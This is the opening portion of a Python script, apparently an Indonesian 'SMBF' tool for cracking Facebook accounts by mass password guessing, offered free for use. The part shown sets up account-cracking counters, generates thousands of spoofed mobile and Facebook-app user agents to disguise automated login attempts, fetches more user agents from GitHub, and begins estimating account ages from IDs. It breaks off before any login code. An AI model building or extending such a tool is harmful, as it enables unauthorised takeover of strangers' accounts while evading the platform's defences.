# TERAKHIR UPDATE SMBF
# SABTU 16-09-2023
# CYXIEON-XR

# note ini sc free ya klo udh enak jangan di premiumin
# note yang udah tau jangan di ubah - ubah  hargai :-)

#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  
infinix = random.choice(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])

for Xr in range (10000):	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(5, 13)
	c='Build/'
	d='0'
	e=random.randrange(1,13)
	f='0'
	g=random.randrange(8,20)
	h='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	i=random.randrange(73,112)
	j='0'
	k=random.randrange(4200,4900)
	l=random.randrange(40,150)
	m='Mobile Safari/534.36'
	uaku=(f'{a} {b}; {infinix} {c}{d}{e}{f}{g}) {h}{i}.{j}.{k}.{l} {m}')
	ugen.append(uaku)
	
	#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1'])
    g2 = random.choice(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])
    u1 = f"Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 2 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android 9; Jazz 2 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/371.0.0.10.104;]"
    u3 = f"Mozilla/5.0 (Linux; Android 11; Vodafone Lite 4G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/372.0.0.15.104;]"
    u4 = f"Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android 7.1.1; Redmi 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36"
    u6 = f"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; OPPO PBBM30 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u7 = f"Mozilla/5.0 (Linux; Android 11; Infinix X688B Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/93.0.4577.62 Seluler Safari/537.36"
    u8 = f"Mozilla/5.0 (Linux; Android 5.1; POLYTRON R2457 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36"
    u9 = f"Mozilla/5.0 (Linux; U; Android 12; vi-vn; CPH2407 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36"
    u10 = f"Mozilla/5.0 (Linux; Android 12; CPH2387) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36"
    u11 = f"Linux; Android 13; M2103K19I Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36"
    u12 = f"Linux; Android 10; TECNO KD6 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.61 Mobile Safari/537.36"
    u13 = f"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/76.0.3809.132 Seluler Safari/537.36"
    u14 = f"Mozilla/5.0 (Linux; Android 6.0; S20+ Pro Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36"
    u15 = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36"
    u16 = f"Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36"
    u17 = f"Mozilla/5.0 (Linux; Android 5.1; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36"
    u18 = f"Mozilla/5.0 (Linux; Android 11; CPH2239 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/110.0.5481.153 Seluler Safari/537.36"
    u19 = f"Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.196 Seluler Safari/537.36"
    u20 = f"Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/94.0.4606.71 Seluler Safari/537.36"
    u21 = f"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A7600-F Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.3"
    u22 = f"Mozilla/5.0 (Linux; U; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36"
    u23 = f"Mozilla/5.0 (Linux; Android 11; Mi 9 SE) AppleWebKit/537.36"
    u24 = f"Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36"
    u25 =f"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
    u26 =f"Mozilla/5.0 (Linux; Android 9; PAHM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
    u27 =f"Mozilla/5.0 (Linux; Android 9; PBDM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36"
    u28 =f"Mozilla/5.0 (Linux; Android 9; PCAM00 Build/PKQ1.190101.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36 OPR/53.1.2569.142848"
    u29 =f"Mozilla/5.0 (Linux; Android 9; PCAT00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
    u30 =f"Mozilla/5.0 (Linux; Android 11; Lenovo L79031 Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36"
    u31 =f"Mozilla/5.0 (Linux; Android 9; PCHM10 Build/PKQ1.190714.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.17 SP-engine/2.13.0 baiduboxapp/11.17.0.13 (Baidu; P1 9)"
    u32 =f"Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36"
    u33 =f"Mozilla/5.0 (Linux; Android 9; PCKM00 Build/PKQ1.190630.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36"
    u34 =f"Mozilla/5.0 (Linux; Android 9; PCLM10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"
    u35 =f"Mozilla/5.0 (Linux; Android 9; PDBM00 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 T7/11.18 SP-engine/2.14.0 baiduboxapp/11.18.0.12 (Baidu; P1 9)"
    u36 =f"Mozilla/5.0 (Linux; Android 13; CPH2525 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/116.0.0.0 Mobile Safari/537.36"
    u37 =f"Mozilla/5.0 (Linux; Android 11; CPH2493 Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.86.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/133.0.0.00.24;]"
    u38 =f"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
    u39 =f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36"
    u40 =f"Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A37m Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u41 =f"Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; A31 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.114 Mobile Safari/537.36"
    u42 =f"Mozilla/5.0 (Linux; U; Android 5.1; en-gb; OPPO F1s Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u43 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO R11s Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u44 =f"Mozilla/5.0 (Linux; U; Android 9; en-au; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u45 =f"Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; OPPO R7st Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u46 =f"Mozilla/5.0 (Linux; U; Android 9; in-id; CPH2071 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u47 =f"Mozilla/5.0 (Linux; U; Android 7.1.1; en-nz; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u48 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; vi-vn; OPPO PBFT00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u49 =f"Mozilla/5.0 (Linux; U; Android 9; CPH1937 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u50 =f"Mozilla/5.0 (Linux; U; Android 9; fr-fr; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u51 =f"Mozilla/5.0 (Linux; Android 8.1.0; PBCM30 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Oppo57"
    u52 =f"Mozilla/5.0 (Linux; U; Android 5.1.1; gu-in; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u53 =f"Mozilla/5.0 (Linux; U; Android 5.1; en-us; OPPO A37f Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppocph"
    u54 =f"Mozilla/5.0 (Linux; U; Android 9; ar-eg; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u55 =f"Mozilla/5.0 (Linux; U; Android 9; en-au; CPH2083 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u56 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; fr-fr; CPH1853 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u57 =f"Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u58 =f"Mozilla/5.0 (Linux; U; Android 9; hi-in; CPH2083 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 Oppo57"
    u59 =f"Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; PAAM00 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.60 Mobile Safari/537.36 Oppofacebooklite"
    u60 =f"Mozilla/5.0 (Linux; U; Android 7.1.1; ru-ru; OPPO R11t Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u61 =f"Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36"
    u62 =f"Mozilla/5.0 (Linux; U; Android 9; en-au; CPH2015 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u63 =f"Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1933 Build/PKQ1.190714.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u64 =f"Mozilla/5.0 (Linux; U; Android 9; th-th; CPH1823 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u65 =f"Mozilla/5.0 (Linux; U; Android 9; en-us; CPH1893 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36"
    u66 =f"Mozilla/5.0 (Linux; Android 11; moto g(20) Build/RTAS31.68-66-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]"
    u67 =f"Mozilla/5.0 (Linux; Android 10; SM-A105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108;]"
    u68 =f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 GLS/98.10.8539.40"
    u69 =f"Mozilla/5.0 (Linux; Android 13; Pixel 3 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36/gonative"
    u70 =f"Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]"
    u71 =f"TuneIn Radio/26.3.0; iPhone8,1; iOS/15.7.8"
    u72 =f"Mozilla/5.0 (Linux; Android 13; Pixel 3 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36"
    u73 =f"Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]"
    u74 =f"Mozilla/5.0 (Linux; Android 13; V2207 Build/TP1A.220624.014_IN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36"
    u75 =f"Mozilla/5.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
    u76 =f"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00K Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
    u77 =f"Mozilla/5.0 (Linux; Android 6.0; S5E_NXT Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
    u78 =f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
    u79 =f"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
    u80 =f"Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69; ]"
    u81 =f"Mozilla/5.0 (Linux; Android 5.1; XT1039 Build/LPBS23.13-17.6-1; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/ 112.0.0.17.70;]"
    u82 =f"Mozilla/5.0 (Linux; Android 5.1; A33w Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/120.0.0.14.84; ]"
    u83 =f"Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70; ]"
    u84 =f"Mozilla/5.0 (Linux; Android 4.4.2; 1201 Build/KOT49H) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/128.0.0.21.88; ]"
    u85 =f"Mozilla/5.0 (Linux; Android 4.4.2; LG-F460K Build/KOT49I.F460K11e) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/125.0. 0.22.70;]"
    u86 =f"Mozilla/5.0 (Linux; Android 5.1.1; F1w Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/126.0.0.9. 84;]"
    u87 =f"Mozilla/5.0 (Linux; Android 5.1; N9518 Build/LMY47O; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/105.0.0.16.69; ]"
    u88 =f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    u89 =f"Mozilla/5.0 (Linux; Android 13; M2012K11AG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36"
    u90 =f"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5514D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36"
    u91 =f"Mozilla/5.0 (Linux; U; Android 9; zh-CN; MZ-meizu M10 Build/MRA58K) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/57.0.2987.108 MZBrowser/7.99.141-2019091915 UWS/2.15 .0.4 Safari Seluler/537.36"
    u92 =f"Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36"
    u93 =f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120H) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/11.2 Chrome/75.0.3770.143 Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5, u6, u7, u8, u9, u10, u11, u12, u13, u14, u15, u16, u17, u18, u19, u20, u21, u22, u23, u24, u25, u26, u27, u28, u29, u30, u31, u32, u33, u34, u35, u36, u37, u38, u39, u40, u41, u42, u43, u44, u45, u46, u47, u48, u49, u50, u51, u52, u53, u54, u55, u56, u57, u58, u59, u60, u61, u62, u63, u64, u65, u66, u67, u68, u69, u70, u71, u72, u73, u74, u75, u76, u77, u78,u79,u80,u81,u82,u83, u84, u85, u86, u87, u88, u89, u90, u91, u92, u93])

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
